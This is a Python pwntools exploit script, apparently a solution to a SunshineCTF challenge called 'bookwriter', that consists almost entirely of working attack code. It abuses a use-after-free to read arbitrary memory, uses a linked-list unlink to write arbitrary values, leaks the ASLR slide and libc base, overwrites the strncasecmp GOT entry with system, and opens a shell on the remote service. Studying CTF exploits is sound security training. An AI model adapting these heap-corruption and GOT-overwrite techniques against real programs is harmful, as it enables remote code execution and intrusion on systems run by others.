from pwn import *

REMOTE = 1

exe = ELF("bookwriter")


def read_page(r):
	r.recvuntil("Page number ")
	pageNumber = int(r.recvuntil(":")[:-1])
	pageLines = r.recvuntil("What do you want to do?").split("\n")
	pageContents = "\n".join(pageLines[2:-2])
	return (pageNumber, pageContents)

def menu(r, choice):
	r.recvuntil("> ")
	r.sendline(str(choice))


def insert_page(r, *lines):
	menu(r, 3)
	r.recvuntil("End it with a line containing only END\n\n")
	for line in lines:
		r.sendline(line)
	r.sendline("END")
	return read_page(r)

def prev_page(r):
	menu(r, 1)
	return read_page(r)

def next_page(r):
	menu(r, 2)
	return read_page(r)

def delete_page(r):
	menu(r, 4)
	return read_page(r)

def leak_string(r, addr):
	"""
	Leak a C string starting at addr.
	"""
	if '\0' in p32(addr):
		warn("Null byte in leak address (0x%08x)" % addr)
	
	# 1. Insert w/ small text
	page, text = insert_page(r, "%x" % addr)
	
	# 2. Delete page
	delete_page(r)
	
	# 3. Insert w/ crafted small text
	payload = p32(addr) + "BBBB"
	uafPage, uafText = insert_page(r, payload)
	
	# 4. Previous page
	leakPage, leakText = prev_page(r)
	
	# Sanity check
	if leakPage != page:
		warn("UAF might not have worked...")
	
	# 5. Read page
	return leakText + "\0"

def leak_strings(r, addr):
	"""
	Generator that yields a C string per iteration.
	"""
	try:
		while True:
			leaked = leak_string(r, addr)
			addr += len(leaked)
			yield leaked
	except KeyboardInterrupt:
		pass
	except Exception, e:
		print("Exception at address 0x%x: e" % (addr, e))

def read_bytes(r, addr, size=None):
	"""
	Perform memory leaks to read size bytes from addr.
	"""
	leaks = []
	size_leaked = 0
	for leaked in leak_strings(r, addr):
		leaks.append(leaked)
		size_leaked += len(leaked)
		if size is not None and size_leaked >= size:
			break
	
	all_leaks = "".join(leaks)
	return all_leaks[:size]

def read8(r, addr):
	return u8(read_bytes(r, addr, 1))

def read16(r, addr):
	return u16(read_bytes(r, addr, 2))

def read32(r, addr):
	return u32(read_bytes(r, addr, 4))


def build_fake_page(text, prev, next):
	return p32(text) + p32(prev) + p32(next)

def enter_fake_page(r, text, prev, next):
	# 1. Create page whose text contains the fake page data
	pageAddr, _ = insert_page(r, build_fake_page(text, prev, next))
	
	# 2. Read value of page->text
	fakeAddr = read32(r, pageAddr)
	
	# 3. Insert w/ small text
	insert_page(r, "%x" % fakeAddr)
	
	# 4. Delete page
	delete_page(r)
	
	# 5. Insert w/ crafted small text
	payload = p32(fakeAddr) + p32(fakeAddr)
	insert_page(r, payload)
	
	# 6. Previous page to get to corrupted page
	_, text = prev_page(r)
	
	# 7. Previous page to get to fake page
	addr, text = prev_page(r)
	
	if addr != fakeAddr:
		warn("Entered unexpected page 0x%x, expected 0x%x" % (addr, fakeAddr))
	
	return addr, text

def write16(r, sixtyFourK, addr, value):
	# Create a new page just so we have a pointer to free
	objAddr, _ = insert_page(r, "free_me!")
	
	# Craft the contents of the current page
	enter_fake_page(r, objAddr, addr - 8, sixtyFourK | (value & 0xffff))
	
	# The doubly-linked list unlink is what writes the 16-bit value
	"""
	// This line is what will cause the write to occur
	prev->next = next;
	
	// This line does a write that we don't care about (in 64k region)
	next->prev = prev;
	"""
	delete_page(r)

def write32(r, sixtyFourK, addr, value):
	write16(r, sixtyFourK, addr, value)
	write16(r, sixtyFourK, addr + 2, value >> 16)


def interactive_leak(r):
	"""
	Start an interactive leaking session.
	"""
	try:
		while True:
			addr = int(raw_input("Addr: "), 0)
			print("=> 0x%x" % read32(r, addr))
	except KeyboardInterrupt:
		return
	except:
		print("Exception at address 0x%x" % addr)


def connect_remote():
	global libc
	libc = ELF("bookwriter-libc.so")
	return remote("chal1.sunshinectf.org", 20002)

def connect_local():
	global libc
	libc = ELF("/lib/i386-linux-gnu/libc.so.6")
	r = exe.process()
	gdb.attach(r, "c")
	return r


def main():
	# context(binary=exe, log_level="debug")
	context(binary=exe)
	
	if REMOTE:
		r = connect_remote()
	else:
		r = connect_local()
	
	
	### STAGE 1: Read cover page address to calculate ASLR slide of main executable
	cover_page, _ = read_page(r)
	aslr_slide = cover_page - exe.symbols["g_cover"]
	info("ASLR slide: 0x%x" % (aslr_slide,))
	exe.address += aslr_slide
	
	
	### STAGE 2: Adjust the heap
	
	#Add a page to find where in the heap we are
	addr, _ = insert_page(r, "findHeap")
	info("Heap object at 0x%x" % (addr,))
	
	# We want to expand the heap to the next multiple of 0x10000, so that
	# when we write to an address with the lower two bytes cleared it
	# won't crash.
	# We actually add 0x30000 so that the text contains an entire 64k
	# region of writeable data we can use.
	target = (addr + 0x30000 - 1) & ~0xffff + 0x100
	distance = target - addr
	lines = ["A"*198] * (distance // 199 + 1)
	
	adjAddr, _ = insert_page(r, *lines)
	if adjAddr < target:
		warn("Failed to adjust heap as desired: 0x%x < 0x%x" % (adjAddr, target))
	
	# Address of beginning of 64k aligned region of 64k bytes
	sixtyFourK = (adjAddr & ~0xffff) - 0x10000
	info("64k region at 0x%x" % (sixtyFourK,))
	
	# Make sure that page->next points to an object allocated after heap adjustment
	insert_page(r, "nocrash")
	prev_page(r)
	
	
	### STAGE 3: Find libc
	puts_addr = read32(r, exe.got["puts"])
	info("*puts.got is 0x%x" % puts_addr)
	
	libc_addr = puts_addr - libc.symbols["puts"]
	libc.address = libc_addr
	info("libc base address is 0x%x" % (libc_addr,))
	
	
	### STAGE 4: Replace strncasecmp.got with system
	write32(r, sixtyFourK, exe.got["strncasecmp"], libc.symbols["system"])
	
	
	### STAGE 5: Invoke system("/bin/sh")
	menu(r, 0)
	r.recvuntil("[y/N] ")
	r.sendline("/bin/sh")
	
	### STAGE N: Interact with shell
	info("Got a shell!")
	r.interactive()


if __name__ == "__main__":
	main()
